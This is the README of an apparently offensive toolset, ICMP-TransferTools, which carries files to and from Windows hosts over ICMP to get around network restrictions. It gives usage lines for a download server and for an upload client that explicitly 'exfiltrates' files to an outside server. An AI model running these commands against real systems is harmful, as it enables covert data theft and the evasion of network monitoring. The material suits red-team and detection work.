# ICMP-TransferTools
ICMP-TransferTools is a set of scripts designed to move files to and from Windows hosts in restricted network environments. This is accomplished using a total of 4 different files, consisting of a python server and powershell client for each transfer direction (Download & Upload).

The only dependency required is `Impacket` for one of the python scripts. It can be installed via pip like so:
```
pip3 install impacket
```

## Download via ICMP
The included `ICMP-SendFile.py` and `Invoke-IcmpDownload.ps1` scripts can be used to download a file to a Windows host via ICMP.

The python server must be run first to stage the file for download. See below for the script's usage:
```
usage: ICMP-SendFile.py [-h] [-v] [-b 1000] source destination file

ICYGUIDER'S ICMP FILE DOWNLOAD SERVER

positional arguments:
  source                Public IP address of current host
  destination           Public IP address of destination host
  file                  File to transfer over ICMP

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Verbosely print progress
  -b 1000, --block-size 1000
                        Size of each block (Default: 1000)
```

Once imported, the powershell client can then be used to download the staged file like so:
```
Invoke-IcmpDownload PublicIPAddressOfServer FileToDownload
```
 
See below for a quick demonstration:

![Download Demo Gif](https://i.imgur.com/xWlZutV.gif)

## Upload via ICMP
The included `ICMP-ReceiveFile.py` and `Invoke-IcmpUpload.ps1` scripts can be used to upload/exfiltrate a file from a Windows host via ICMP.

The python server must be run first to ensure it's ready to accept requests from the client. See below for the script's usage:
```
usage: ICMP-ReceiveFile.py [-h] src file

ICYGUIDER'S ICMP FILE UPLOAD SERVER

positional arguments:
  src         Public IP Address of client
  file        File to write data to

optional arguments:
  -h, --help  show this help message and exit
```

Once imported, the powershell client can then be used to upload the desired file like so:
```
Invoke-IcmpUpload PublicIPAddressOfServer FileToUpload
```

See below for a quick demonstration:

![Upload Demo Gif](https://i.imgur.com/4fWaZi3.gif)
